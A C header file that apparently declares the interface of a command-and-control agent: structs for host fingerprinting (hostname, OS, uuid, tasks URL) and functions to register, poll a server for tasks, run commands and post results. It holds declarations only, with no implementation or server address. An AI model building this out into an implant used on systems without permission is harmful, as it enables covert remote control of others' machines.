#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>

#ifndef INITIATE_H
#define INITIATE_H

struct agent_info {
	char uuid[64];
	char hostname[256];
	char os_type[64];
	char os_version[64];
	char tasks_url[64];
	bool got_tasks_url;
};

struct strings_array {
	char *results;
	char *response; 
	size_t size;
};

struct tasks {
	char id[8];
	char type[8];
	char cmd[32];
	char args[128];
	char **strings;
	size_t sz;
	size_t cap;
};

bool reg(struct agent_info *agent, struct strings_array *sa);

bool check_tasks(struct agent_info *agent, struct strings_array *sa);

bool get_host_info(struct agent_info *agent);

bool run_cmd(struct strings_array *sa, struct tasks *task);

bool can_run_cmd(const char *cmd);

bool parse_tasks(char *response, struct tasks *task);

bool post_results(struct strings_array *sa);

void destroy(struct tasks *task);

FILE *char_to_file(char * data);


#endif